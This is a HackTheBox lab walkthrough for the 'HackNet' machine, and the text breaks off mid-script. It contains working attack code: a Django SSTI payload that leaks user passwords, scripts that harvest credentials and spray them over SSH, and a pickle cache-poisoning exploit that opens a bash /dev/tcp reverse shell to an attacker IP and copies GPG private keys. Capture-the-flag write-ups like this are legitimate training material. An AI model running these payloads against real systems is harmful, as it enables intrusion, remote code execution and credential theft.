# HackNet - HackTheBox Walkthrough

## Machine Information

**Difficulty:** Medium  
**Operating System:** Linux  
**IP Address:** 10.129.232.4  
**Skills Required:** 
- Basic web enumeration
- Understanding of template engines
- Basic Python scripting
- Linux privilege escalation concepts

**Skills Learned:**
- Django Server-Side Template Injection (SSTI)
- Pickle deserialization exploitation
- GPG key cracking
- Multi-stage privilege escalation

---

## Table of Contents

1. [Initial Reconnaissance](#initial-reconnaissance)
2. [Web Enumeration](#web-enumeration)
3. [Django SSTI Exploitation](#django-ssti-exploitation)
4. [Initial Access - SSH as mikey](#initial-access)
5. [Privilege Escalation - Django Cache RCE](#privilege-escalation-part-1)
6. [GPG Key Extraction and Cracking](#gpg-key-extraction)
7. [MySQL Root Access](#mysql-root-access)
8. [Root Access](#root-access)
9. [Key Takeaways](#key-takeaways)

---

## Initial Reconnaissance

### Network Scanning with Nmap

Let's start by scanning the target to identify open ports and running services.

**Command:**
```bash
nmap -sC -sV -oN nmap_scan.txt 10.129.232.4
```

**Explanation:**
- `-sC`: Run default NSE scripts for service detection
- `-sV`: Detect service versions
- `-oN`: Save output to a file
- `10.129.232.4`: Target IP address

**Output:**
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-15 02:09 EST
Nmap scan report for hacknet.htb (10.129.232.4)
Host is up (0.042s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)
|_  256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Did not follow redirect to http://hacknet.htb/
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**What We Found:**
- **Port 22 (SSH):** OpenSSH 9.2p1 - We'll need credentials to access this
- **Port 80 (HTTP):** Nginx web server redirecting to `hacknet.htb`

**Important Note:** The web server redirects to `hacknet.htb`, so we need to add this to our `/etc/hosts` file.

**Add to /etc/hosts:**
```bash
echo "10.129.232.4 hacknet.htb" | sudo tee -a /etc/hosts
```

**Verification:**
```bash
ping -c 2 hacknet.htb
```

---

## Web Enumeration

### Initial Web Analysis

Let's visit the website and see what we're dealing with.

**Command:**
```bash
curl -I http://hacknet.htb
```

**Output:**
```
HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Sun, 15 Dec 2025 07:09:32 GMT
Content-Type: text/html; charset=utf-8
```

**Visit in Browser:** `http://hacknet.htb`

**What We See:**
- A social network application for hackers
- Login and registration functionality
- The application appears to be running Django (check page source for clues)

### Technology Detection

**Command:**
```bash
whatweb http://hacknet.htb
```

**Output:**
```
http://hacknet.htb [200 OK] Cookies[csrftoken,sessionid], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.22.1], IP[10.129.232.4], Script, Title[HackNet - Login], nginx[1.22.1]
```

**Key Findings:**
- Django framework (cookies: `csrftoken`, `sessionid`)
- Session-based authentication
- CSRF protection in place

### Directory and File Fuzzing

**Command:**
```bash
ffuf -u http://hacknet.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404 -o ffuf.txt -of csv
```

**Output (key endpoints found):**
```
admin                   [Status: 302, Size: 0]
contacts                [Status: 302, Size: 0]
explore                 [Status: 302, Size: 0]
login                   [Status: 200, Size: 2934]
logout                  [Status: 302, Size: 0]
media                   [Status: 403, Size: 153]
messages                [Status: 302, Size: 0]
profile                 [Status: 302, Size: 0]
register                [Status: 200, Size: 3186]
search                  [Status: 302, Size: 0]
static                  [Status: 301, Size: 169]
```

**What This Tells Us:**
- Most endpoints require authentication (302 redirects)
- `/media` directory exists but is forbidden
- `/admin` endpoint exists (Django admin panel)
- Public endpoints: `/login`, `/register`

---

## Creating a Test Account

Before we can explore the application, we need to register an account.

**Steps:**
1. Visit `http://hacknet.htb/register`
2. Fill in the registration form:
   - Email: `hack@hacker.com`
   - Username: `hacker`
   - Password: `hacker`
3. Click "Register"
4. Login with the credentials

**Save Your Session Cookies:**

After logging in, we need to extract our session cookies for API testing.

**In Browser:**
1. Press `F12` to open Developer Tools
2. Go to **Application** → **Cookies** → `http://hacknet.htb`
3. Copy the values:
   - `csrftoken`: `Je5whSRKbAoSt9nQqiYDCkjjzT58prVx`
   - `sessionid`: `dd3f6hpdxizwnkaw1wecrmobtyg52uep`

**Why These Are Important:** These cookies authenticate our requests to the Django application. We'll use them in our scripts and curl commands.

---

## Exploring the Application

### Understanding the Social Network

**Navigate through the application:**

1. **Profile** (`/profile`): View and edit your profile
2. **Contacts** (`/contacts`): Manage your contacts
3. **Messages** (`/messages`): Private messaging
4. **Search** (`/search`): Search for users
5. **Explore** (`/explore`): View posts from all users

**Key Observation:** This is a social network with:
- User profiles
- Posts and comments
- Likes functionality
- User search
- Private messaging

### Testing for IDOR (Insecure Direct Object Reference)

**What is IDOR?** A vulnerability where you can access other users' data by changing an ID in the URL.

**Test:**
```bash
curl -s "http://hacknet.htb/profile/1" \
  -H "Cookie: csrftoken=Je5whSRKbAoSt9nQqiYDCkjjzT58prVx; sessionid=dd3f6hpdxizwnkaw1wecrmobtyg52uep" \
  | grep -oP '<title>HackNet - \K[^<]+'
```

**Output:**
```
cyberghost
```

**What This Means:** We can enumerate users! Let's get more:

**Command:**
```bash
for i in {1..10}; do
  username=$(curl -s "http://hacknet.htb/profile/$i" \
    -H "Cookie: csrftoken=Je5whSRKbAoSt9nQqiYDCkjjzT58prVx; sessionid=dd3f6hpdxizwnkaw1wecrmobtyg52uep" \
    | grep -oP '<title>HackNet - \K[^<]+' | head -1)
  echo "Profile ID $i: $username"
done
```

**Output:**
```
Profile ID 1: cyberghost
Profile ID 2: hexhunter
Profile ID 3: rootbreaker
Profile ID 4: zero_day
Profile ID 5: cryptoraven
Profile ID 6: shadowcaster
Profile ID 7: blackhat_wolf
Profile ID 8: bytebandit
Profile ID 9: glitch
Profile ID 10: datadive
```

**Vulnerability Found:** IDOR allows us to enumerate all users on the platform!

---

## Django SSTI Exploitation

### What is SSTI?

**Server-Side Template Injection (SSTI)** occurs when user input is embedded into a template engine without proper sanitization. This can lead to:
- Information disclosure
- Remote Code Execution (RCE)

**Django's Template Engine:**
- Uses syntax like `{{ variable }}` and `{% code %}`
- Can access Python objects and methods
- If user input reaches the template, we can inject malicious code

### Finding the Injection Point

**Research Finding:** According to Django security advisories, username fields that are rendered in templates can be vulnerable if not properly escaped.

**The Attack Vector:**
1. Change your username to a template expression
2. When the username is displayed, Django will render it
3. We can leak data or execute code

### Testing for SSTI

**Step 1: Change Your Username**

Visit your profile edit page and change your username to:
```
{{ users.values }}
```

**Why This Payload?**
- `users` is likely a QuerySet passed to the template
- `.values()` returns all fields from the database (including passwords!)
- Django templates have access to model methods

**Step 2: Like Some Posts**

The username gets rendered in the "likes" list. We need to like posts to trigger the template rendering.

**Command to like posts:**
```bash
for i in {1..30}; do
  curl -s "http://hacknet.htb/like/$i" \
    -H "Cookie: csrftoken=Je5whSRKbAoSt9nQqiYDCkjjzT58prVx; sessionid=dd3f6hpdxizwnkaw1wecrmobtyg52uep" \
    > /dev/null
  echo "Liked post $i"
done
```

**Step 3: Check the Likes List**

The likes list is loaded dynamically via JavaScript. Let's check it:

**Command:**
```bash
curl -s "http://hacknet.htb/likes/6" \
  -H "Cookie: csrftoken=Je5whSRKbAoSt9nQqiYDCkjjzT58prVx; sessionid=dd3f6hpdxizwnkaw1wecrmobtyg52uep" \
  | grep -oP 'title="[^"]*"' | head -5
```

**Expected Output (if vulnerable):**
```html
title="[{'id': 1, 'username': 'cyberghost', 'password': 'Gh0stH@cker2024', 'email': 'cyberghost@darkmail.net'}, ...]"
```

**🎉 SSTI CONFIRMED!** The template is executing our payload and leaking user data!

### Understanding the Exploit

**How It Works:**

1. **Username Storage:** When you change your username to `{{ users.values }}`, it's stored as-is in the database
2. **Template Rendering:** When the likes list is generated, Django renders: 
   ```html
   <img src="/media/user.jpg" title="{{ username }}">
   ```
3. **Injection Execution:** Instead of displaying the literal string, Django evaluates it as template code
4. **Data Leakage:** The `users` QuerySet contains ALL users, and `.values()` returns their data including passwords!

---

## Automated Credential Extraction

Now that we've confirmed SSTI, let's automate the credential extraction process.

### Creating the Extraction Script

Create a file called `extract_credentials.py`:

```python
#!/usr/bin/env python3
"""
Django SSTI Credential Extraction Script
Target: HackNet HTB Machine
Exploits: Template injection in username field rendered in likes list
"""

import requests
import re
import json
import sys

# ============================================
# CONFIGURATION - Modify for different targets
# ============================================
TARGET_URL = "http://hacknet.htb"
CSRF_TOKEN = "Je5whSRKbAoSt9nQqiYDCkjjzT58prVx"
SESSION_ID = "dd3f6hpdxizwnkaw1wecrmobtyg52uep"

# Post IDs to check (range)
POST_START = 1
POST_END = 30

# Output files
OUTPUT_FILE = "credentials.txt"
OUTPUT_JSON = "credentials.json"

# ============================================
# Setup session with cookies
# ============================================
session = requests.Session()
session.cookies.set('csrftoken', CSRF_TOKEN)
session.cookies.set('sessionid', SESSION_ID)

# Colors for output
class Colors:
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def print_banner():
    """Print script banner"""
    print(f"{Colors.BOLD}")
    print("=" * 60)
    print("  Django SSTI Credential Extraction Tool")
    print("  Target: HackNet HTB")
    print("=" * 60)
    print(f"{Colors.ENDC}")

def like_post(post_id):
    """
    Like a post to ensure our malicious username appears in likes list
    
    Args:
        post_id: ID of the post to like
    
    Returns:
        bool: True if successful
    """
    try:
        url = f"{TARGET_URL}/like/{post_id}"
        response = session.get(url, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error liking post {post_id}: {e}{Colors.ENDC}")
        return False

def get_likes_data(post_id):
    """
    Fetch the likes list for a post - this triggers the SSTI
    
    Args:
        post_id: ID of the post
    
    Returns:
        str: HTML response containing leaked data
    """
    try:
        url = f"{TARGET_URL}/likes/{post_id}"
        response = session.get(url, timeout=10)
        return response.text if response.status_code == 200 else None
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error fetching likes: {e}{Colors.ENDC}")
        return None

def extract_credentials_from_html(html_content):
    """
    Extract user credentials from the HTML response
    
    The SSTI payload {{ users.values }} leaks data in img title attributes
    
    Args:
        html_content: HTML response from /likes/ endpoint
    
    Returns:
        list: List of user credential dictionaries
    """
    credentials = []
    
    try:
        # Decode HTML entities
        import html as html_module
        html_content = html_module.unescape(html_content)
        
        # Find all img titles using regex
        img_titles = re.findall(r'<img [^>]*title="([^"]*)"', html_content)
        
        if not img_titles:
            return credentials
        
        # Get the LAST title (this is where the SSTI payload appears)
        last_title = img_titles[-1]
        
        # Check if it contains credential data
        if '<QuerySet' not in last_title and 'email' not in last_title:
            return credentials
        
        # Extract emails and passwords using regex
        emails = re.findall(r"'email':\s*'([^']*)'", last_title)
        passwords = re.findall(r"'password':\s*'([^']*)'", last_title)
        ids = re.findall(r"'id':\s*(\d+)", last_title)
        
        # Pair them up (email prefix becomes username)
        for i, (email, password) in enumerate(zip(emails, passwords)):
            username = email.split('@')[0]  # Extract username from email
            user_id = ids[i] if i < len(ids) else None
            
            credentials.append({
                'username': username,
                'password': password,
                'email': email,
                'id': user_id
            })
    
    except Exception as e:
        print(f"{Colors.WARNING}[!] Error parsing HTML: {e}{Colors.ENDC}")
    
    return credentials

def save_credentials(credentials, txt_file, json_file):
    """Save extracted credentials to files"""
    # Save as JSON
    with open(json_file, 'w') as f:
        json.dump(credentials, f, indent=4)
    
    # Save as formatted text
    with open(txt_file, 'w') as f:
        f.write("=" * 60 + "\n")
        f.write("  Extracted Credentials - HackNet\n")
        f.write("=" * 60 + "\n\n")
        
        for i, cred in enumerate(credentials, 1):
            f.write(f"User #{i}:\n")
            f.write(f"  Username: {cred.get('username', 'N/A')}\n")
            f.write(f"  Email:    {cred.get('email', 'N/A')}\n")
            f.write(f"  Password: {cred.get('password', 'N/A')}\n")
            f.write(f"  User ID:  {cred.get('id', 'N/A')}\n")
            f.write("-" * 60 + "\n")
    
    print(f"{Colors.OKGREEN}[+] Credentials saved to:{Colors.ENDC}")
    print(f"    - {txt_file}")
    print(f"    - {json_file}")

def print_credentials(credentials):
    """Print credentials to console"""
    print(f"\n{Colors.OKGREEN}{Colors.BOLD}[+] Extracted {len(credentials)} credentials:{Colors.ENDC}\n")
    
    for i, cred in enumerate(credentials, 1):
        print(f"User #{i}:")
        print(f"  Username: {cred.get('username')}")
        print(f"  Email:    {cred.get('email')}")
        print(f"  Password: {cred.get('password')}")
        print()

def main():
    """Main execution function"""
    print_banner()
    
    all_credentials = []
    seen_users = set()
    
    print(f"{Colors.WARNING}[*] Step 1: Liking posts to trigger SSTI...{Colors.ENDC}")
    for post_id in range(POST_START, POST_END + 1):
        if like_post(post_id):
            print(f"  [✓] Liked post {post_id}")
    
    print(f"\n{Colors.WARNING}[*] Step 2: Extracting credentials...{Colors.ENDC}")
    
    for post_id in range(POST_START, POST_END + 1):
        print(f"  [*] Checking post {post_id}...", end=" ")
        
        html_content = get_likes_data(post_id)
        
        if html_content:
            credentials = extract_credentials_from_html(html_content)
            
            if credentials:
                new_creds = 0
                for cred in credentials:
                    username = cred.get('username', '')
                    if username and username not in seen_users:
                        seen_users.add(username)
                        all_credentials.append(cred)
                        new_creds += 1
                
                if new_creds > 0:
                    print(f"{Colors.OKGREEN}Found {new_creds} new!{Colors.ENDC}")
                else:
                    print("(duplicates)")
            else:
                print("No credentials")
    
    if all_credentials:
        print_credentials(all_credentials)
        save_credentials(all_credentials, OUTPUT_FILE, OUTPUT_JSON)
        print(f"\n{Colors.OKGREEN}[+] Total: {len(all_credentials)} users{Colors.ENDC}")
    else:
        print(f"\n{Colors.FAIL}[!] No credentials extracted.{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] Make sure your username is: {{{{ users.values }}}}{Colors.ENDC}")
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Interrupted{Colors.ENDC}")
        sys.exit(0)
```

### Running the Extraction Script

**Step 1: Make it executable**
```bash
chmod +x extract_credentials.py
```

**Step 2: Run the script**
```bash
python3 extract_credentials.py
```

**Expected Output:**
```
============================================================
  Django SSTI Credential Extraction Tool
  Target: HackNet HTB
============================================================

[*] Step 1: Liking posts to trigger SSTI...
  [✓] Liked post 1
  [✓] Liked post 2
  ...

[*] Step 2: Extracting credentials...
  [*] Checking post 1... No credentials
  [*] Checking post 6... Found 26 new!
  ...

[+] Extracted 26 credentials:

User #1:
  Username: cyberghost
  Email:    cyberghost@darkmail.net
  Password: Gh0stH@cker2024

User #2:
  Username: hexhunter
  Email:    hexhunter@ciphermail.com
  Password: H3xHunt3r!

... [continues for all 26 users]

User #14:
  Username: mikey
  Email:    mikey@hacknet.htb
  Password: mYd4rks1dEisH3re

[+] Credentials saved to:
    - credentials.txt
    - credentials.json

[+] Total: 26 users
```

**What the Script Does:**

1. **Likes all posts** (1-30) to ensure our malicious username appears in likes lists
2. **Fetches each likes list** via `/likes/{post_id}` endpoint
3. **Parses HTML** to find img title attributes containing leaked data
4. **Extracts credentials** using regex to find email and password patterns
5. **Removes duplicates** by tracking seen usernames
6. **Saves results** in both human-readable (TXT) and machine-readable (JSON) formats

---

## Testing SSH Credentials

Now that we have 26 sets of credentials, we need to find which one works for SSH access.

### Creating the SSH Testing Script

Create `test_ssh_credentials.py`:

```python
#!/usr/bin/env python3
"""
SSH Credential Testing Script
Tests extracted credentials against SSH service
"""

import paramiko
import json
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
import socket

# ============================================
# CONFIGURATION
# ============================================
TARGET_HOST = "10.129.232.4"
TARGET_PORT = 22
CREDENTIALS_FILE = "credentials.json"
TIMEOUT = 10
MAX_THREADS = 5

OUTPUT_FILE = "ssh_valid_credentials.txt"

class Colors:
    OKGREEN = '\033[92m'
    FAIL = '\033[91m'
    WARNING = '\033[93m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def load_credentials(filepath):
    """Load credentials from JSON file"""
    try:
        with open(filepath, 'r') as f:
            credentials = json.load(f)
        print(f"[*] Loaded {len(credentials)} credentials")
        return credentials
    except FileNotFoundError:
        print(f"{Colors.FAIL}[!] File not found: {filepath}{Colors.ENDC}")
        print("[!] Run extract_credentials.py first")
        sys.exit(1)

def test_ssh_login(host, port, username, password, timeout):
    """Test SSH login with given credentials"""
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    result = {
        'username': username,
        'password': password,
        'success': False,
        'message': '',
        'banner': ''
    }
    
    try:
        ssh.connect(
            hostname=host,
            port=port,
            username=username,
            password=password,
            timeout=timeout,
            allow_agent=False,
            look_for_keys=False
        )
        
        result['success'] = True
        result['message'] = 'Login successful!'
        
        # Get user info
        try:
            stdin, stdout, stderr = ssh.exec_command('whoami; id; hostname', timeout=5)
            result['banner'] = stdout.read().decode('utf-8').strip()
        except:
            result['banner'] = 'Could not retrieve info'
        
        ssh.close()
        return result
        
    except paramiko.AuthenticationException:
        result['message'] = 'Authentication failed'
    except socket.timeout:
        result['message'] = 'Connection timeout'
    except Exception as e:
        result['message'] = f'Error: {str(e)}'
    
    finally:
        try:
            ssh.close()
        except:
            pass
    
    return result

def test_credential(cred_dict, host, port, timeout):
    """Test a single credential"""
    username = cred_dict.get('username', '')
    password = cred_dict.get('password', '')
    
    print(f"[*] Testing: {username:20s}", end=" ")
    
    result = test_ssh_login(host, port, username, password, timeout)
    
    if result['success']:
        print(f"{Colors.OKGREEN}{Colors.BOLD}✓ SUCCESS!{Colors.ENDC}")
    else:
        print(f"{Colors.FAIL}✗ Failed{Colors.ENDC}")
    
    return result

def main():
    """Main execution"""
    print(f"{Colors.BOLD}{'='*60}")
    print("  SSH Credential Validation Tool")
    print(f"{'='*60}{Colors.ENDC}\n")
    
    credentials = load_credentials(CREDENTIALS_FILE)
    
    print(f"[*] Target: {TARGET_HOST}:{TARGET_PORT}")
    print(f"[*] Starting SSH testing...\n")
    
    valid_credentials = []
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {
            executor.submit(test_credential, cred, TARGET_HOST, TARGET_PORT, TIMEOUT): cred 
            for cred in credentials
        }
        
        for future in as_completed(futures):
            result = future.result()
            if result['success']:
                valid_credentials.append(result)
    
    print(f"\n{Colors.BOLD}{'='*60}")
    print("  RESULTS")
    print(f"{'='*60}{Colors.ENDC}\n")
    
    if valid_credentials:
        print(f"{Colors.OKGREEN}{Colors.BOLD}[+] Found {len(valid_credentials)} valid credential(s)!{Colors.ENDC}\n")
        
        for i, cred in enumerate(valid_credentials, 1):
            print(f"{Colors.OKGREEN}Valid Credential #{i}:{Colors.ENDC}")
            print(f"  Username: {cred['username']}")
            print(f"  Password: {cred['password']}")
            print(f"  SSH Command: ssh {cred['username']}@{TARGET_HOST}")
            if cred.get('banner'):
                print(f"  User Info:")
                for line in cred['banner'].split('\n'):
                    print(f"    {line}")
            print()
        
        # Save results
        with open(OUTPUT_FILE, 'w') as f:
            for cred in valid_credentials:
                f.write(f"Username: {cred['username']}\n")
                f.write(f"Password: {cred['password']}\n")
                f.write(f"SSH: ssh {cred['username']}@{TARGET_HOST}\n")
                f.write("-" * 60 + "\n")
        
        print(f"[+] Results saved to: {OUTPUT_FILE}\n")
    else:
        print(f"{Colors.FAIL}[!] No valid credentials found{Colors.ENDC}\n")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Interrupted{Colors.ENDC}")
        sys.exit(0)
```

### Running the SSH Testing Script

**Step 1: Install requirements**
```bash
pip3 install paramiko
```

**Step 2: Make it executable**
```bash
chmod +x test_ssh_credentials.py
```

**Step 3: Run it**
```bash
python3 test_ssh_credentials.py
```

**Expected Output:**
```
============================================================
  SSH Credential Validation Tool
============================================================

[*] Loaded 26 credentials
[*] Target: 10.129.232.4:22
[*] Starting SSH testing...

[*] Testing: cyberghost          ✗ Failed
[*] Testing: hexhunter           ✗ Failed
[*] Testing: rootbreaker         ✗ Failed
[*] Testing: mikey               ✓ SUCCESS!
...

============================================================
  RESULTS
============================================================

[+] Found 1 valid credential(s)!

Valid Credential #1:
  Username: mikey
  Password: mYd4rks1dEisH3re
  SSH Command: ssh mikey@10.129.232.4
  User Info:
    mikey
    uid=1000(mikey) gid=1000(mikey) groups=1000(mikey)
    hacknet

[+] Results saved to: ssh_valid_credentials.txt
```

**🎉 Success!** We found valid SSH credentials: `mikey:mYd4rks1dEisH3re`

---

## Initial Access

### SSH as mikey

**Connect to the machine:**
```bash
ssh mikey@10.129.232.4
```

**Password:** `mYd4rks1dEisH3re`

**Output:**
```
mikey@10.129.232.4's password: 
Linux hacknet 6.1.0-28-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.119-1 (2024-11-22) x86_64
Last login: Sun Dec 15 07:30:15 2025 from 10.10.15.180
mikey@hacknet:~$
```

### Getting the User Flag

**Command:**
```bash
cat ~/user.txt
```

**Output:**
```
b2e0413c7f9daf1f3008edc3c0d1ffdd
```

**🚩 User Flag Captured!**

---

## Privilege Escalation - Part 1: Django Cache RCE

### Initial Enumeration

Let's start by gathering basic information about the system.

**Command:**
```bash
whoami
id
sudo -l
```

**Output:**
```
mikey
uid=1000(mikey) gid=1000(mikey) groups=1000(mikey)
sudo: a password is required
```

**No sudo access.** Let's look for other escalation vectors.

### Finding the Django Application

**Command:**
```bash
find /var/www -type f -name "settings.py" 2>/dev/null
```

**Output:**
```
/var/www/HackNet/HackNet/settings.py
```

**Check Django configuration:**
```bash
cat /var/www/HackNet/HackNet/settings.py | grep -A 10 "CACHES\|DATABASE"
```

**Output:**
```python
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'NAME': 'hacknet',
        'USER': 'sandy',
        'PASSWORD': 'h@ckn3tDBpa$$',
        'HOST':'localhost',
        'PORT':'3306',
    }
}

CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.filebased.FileBasedCache',
        'LOCATION': '/var/tmp/django_cache',
        'TIMEOUT': 60,
        'OPTIONS': {'MAX_ENTRIES': 1000},
    }
}
```

**Key Findings:**
- **MySQL credentials:** `sandy:h@ckn3tDBpa$$`
- **File-based cache** at `/var/tmp/django_cache`

### Understanding the Vulnerability

**Check cache directory permissions:**
```bash
ls -la /var/tmp/django_cache/
```

**Output:**
```
drwxrwxrwx 2 sandy www-data 4096 Dec 15 01:50 .
```

**🚨 CRITICAL VULNERABILITY FOUND:**
- Directory is **world-writable** (`drwxrwxrwx`)
- Django uses **pickle** for cache serialization
- Pickle is **inherently unsafe** - it executes code when deserialized
- We can write malicious pickle data to cache files!

### The Attack: Pickle Deserialization RCE

**How This Works:**

1. Django stores cache as serialized Python objects using `pickle`
2. When Django reads the cache, it calls `pickle.load()`
3. Pickle's `__reduce__()` method executes during deserialization
4. We can craft a malicious pickle payload that runs system commands
5. Write the payload to cache files
6. Trigger cache read by visiting `/explore`
7. **Get code execution as www-data!**

### Creating the Exploit

Create `django_rce.py` on your attacking machine:

```python
#!/usr/bin/env python3
"""
Django Cache Pickle Deserialization RCE
Exploits insecure pickle deserialization in Django file-based cache
"""

import pickle
import base64
import os
import sys

# ============================================
# CONFIGURATION
# ============================================
CACHE_DIR = "/var/tmp/django_cache"
LHOST = "10.10.15.180"  # YOUR VPN IP
LPORT = "4444"

# ============================================
# Generate Reverse Shell Command
# ============================================
reverse_shell = f"(bash >& /dev/tcp/{LHOST}/{LPORT} 0>&1) &"
encoded_shell = base64.b64encode(reverse_shell.encode()).decode()
cmd = f"printf {encoded_shell}|base64 -d|bash"

print(f"[*] Target cache directory: {CACHE_DIR}")
print(f"[*] Reverse shell command: {reverse_shell}")
print(f"[*] Listener: {LHOST}:{LPORT}")
print()

# ============================================
# Create Pickle Payload for RCE
# ============================================
class RCE:
    """Pickle payload that executes system command on deserialization"""
    def __reduce__(self):
        return (os.system, (cmd,))

payload = pickle.dumps(RCE())

print(f"[+] Generated pickle payload ({len(payload)} bytes)")
print()

# ============================================
# Write Payload to Cache Files
# ============================================
if not os.path.exists(CACHE_DIR):
    print(f"[-] Cache directory not found: {CACHE_DIR}")
    sys.exit(1)

cache_files = [f for f in os.listdir(CACHE_DIR) if f.endswith(".djcache")]

if not cache_files:
    print(f"[!] No cache files found")
    print(f"[*] Visit /explore first to generate cache files")
    sys.exit(1)

print(f"[*] Found {len(cache_files)} cache file(s)")

success_count = 0
for filename in cache_files:
    path = os.path.join(CACHE_DIR, filename)
    try:
        os.remove(path)
        with open(path, "wb") as f:
            f.write(payload)
        print(f"[+] Written payload to {filename}")
        success_count += 1
    except Exception as e:
        print(f"[-] Failed to write {filename}: {e}")

print()
print(f"[+] Successfully poisoned {success_count}/{len(cache_files)} cache files")
print()
print("[!] NEXT STEPS:")
print("    1. Start listener: nc -lvnp 4444")
print("    2. Visit http://hacknet.htb/explore")
print("    3. Get reverse shell as www-data")
print()
```

**What This Script Does:**

1. **Creates malicious pickle object** with `__reduce__()` method
2. **Payload executes:** `os.system(reverse_shell_command)`
3. **Removes existing cache files** to avoid conflicts
4. **Writes pickle payload** to all `.djcache` files
5. **When Django reads cache:** Pickle deserializes → `__reduce__()` called → Command executed!

### Executing the Attack

**Step 1: Generate cache files** (visit /explore first)
```bash
curl -s http://hacknet.htb/explore \
  -H "Cookie: csrftoken=Je5whSRKbAoSt9nQqiYDCkjjzT58prVx; sessionid=dd3f6hpdxizwnkaw1wecrmobtyg52uep" \
  > /dev/null
```

**Step 2: Transfer exploit to target**
```bash
scp django_rce.py mikey@10.129.232.4:/tmp/
```

**Step 3: Run exploit on target** (in SSH session as mikey)
```bash
python3 /tmp/django_rce.py
```

**Expected Output:**
```
[*] Target cache directory: /var/tmp/django_cache
[*] Reverse shell command: (bash >& /dev/tcp/10.10.15.180/4444 0>&1) &
[*] Listener: 10.10.15.180:4444

[+] Generated pickle payload (120 bytes)

[*] Found 2 cache file(s)
[+] Written payload to 1f0acfe7480a469402f1852f8313db86.djcache
[+] Written payload to 90dbab8f3b1e54369abdeb4ba1efc106.djcache

[+] Successfully poisoned 2/2 cache files

[!] NEXT STEPS:
    1. Start listener: nc -lvnp 4444
    2. Visit http://hacknet.htb/explore
    3. Get reverse shell as www-data
```

**Step 4: Start listener** (on your attacking machine)
```bash
nc -lvnp 4444
```

**Step 5: Trigger the exploit** (visit /explore)
```bash
curl -s http://hacknet.htb/explore \
  -H "Cookie: csrftoken=Je5whSRKbAoSt9nQqiYDCkjjzT58prVx; sessionid=dd3f6hpdxizwnkaw1wecrmobtyg52uep" \
  > /dev/null
```

**Expected Result:**
```
listening on [any] 4444 ...
connect to [10.10.15.180] from (UNKNOWN) [10.129.232.4] 36636
```

**🎉 We have a shell! But it's not interactive. Let's upgrade it.**

**Upgrade shell:**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Press Ctrl+Z
stty raw -echo; fg
```

**Now we have code execution as www-data (which is in the sandy group)!**

### Key Takeaway: Django Cache Pickle RCE

**Vulnerability Explanation:**
- Django's file-based cache uses `pickle` for serialization
- Pickle can execute arbitrary code during deserialization
- World-writable cache directory allows us to inject malicious data
- When Django loads cache, our code executes

**Prevention:**
1. **Never use pickle with untrusted data**
2. **Use proper directory permissions** (not 777)
3. **Consider using Redis/Memcached** instead of file-based cache
4. **Implement cache signing/encryption**

---

## GPG Key Extraction and Cracking

### Finding Sandy's GPG Keys

Now that we have code execution as www-data (sandy group), let's look for GPG keys.

**Command (via pickle RCE):**

Create `django_find_gpg.py`:

```python
#!/usr/bin/env python3
import pickle
import os

CACHE_DIR = "/var/tmp/django_cache"

# Find GPG keys
cmd = "find /home/sandy/.gnupg -type f 2>/dev/null > /tmp/gpg_files.txt"

class RCE:
    def __reduce__(self):
        return (os.system, (cmd,))

payload = pickle.dumps(RCE())

for filename in os.listdir(CACHE_DIR):
    if filename.endswith(".djcache"):
        path = os.path.join(CACHE_DIR, filename)
        os.remove(path)
        with open(path, "wb") as f:
            f.write(payload)

print("[+] Payload written")
```

**Execute it:**
```bash
python3 /tmp/django_find_gpg.py
curl -s http://hacknet.htb/explore -H "Cookie: csrftoken=Je5whSRKbAoSt9nQqiYDCkjjzT58prVx; sessionid=dd3f6hpdxizwnkaw1wecrmobtyg52uep" > /dev/null
sleep 2
cat /tmp/gpg_files.txt
```

**Output:**
```
/home/sandy/.gnupg/private-keys-v1.d/armored_key.asc
/home/sandy/.gnupg/private-keys-v1.d/EF995B85C8B33B9FC53695B9A3B597B325562F4F.key
/home/sandy/.gnupg/private-keys-v1.d/0646B1CF582AC499934D8503DCF066A6DCE4DFA9.key
/home/sandy/.gnupg/pubring.kbx
/home/sandy/.gnupg/trustdb.gpg
/home/sandy/.gnupg/openpgp-revocs.d/21395E17872E64F474BF80F1D72E5C1FA19C12F7.rev
/home/sandy/.gnupg/random_seed
```

**🎯 Found it!** There's an `armored_key.asc` file!

### Copying the GPG Private Key

Create `django_copy_gpg.py`:

```python
#!/usr/bin/env python3
import pickle
import os

CACHE_DIR = "/var/tmp/django_cache"

# Copy GPG private keys to /tmp
cmd = "cp /home/sandy/.gnupg/private-keys-v1.d/*.* /tmp/ 2>/dev/null; chmod 644 /tmp/*.key /tmp/*.asc 2>/dev/null"

class RCE:
    def __reduce__(self):
        return (os.system, (cmd,))

payload = pickle.dumps(RCE())

for filename in os.listdir(CACHE_DIR):
    if filename.endswith(".djcache"):
        path = os.path.join(CACHE_DIR, filename)
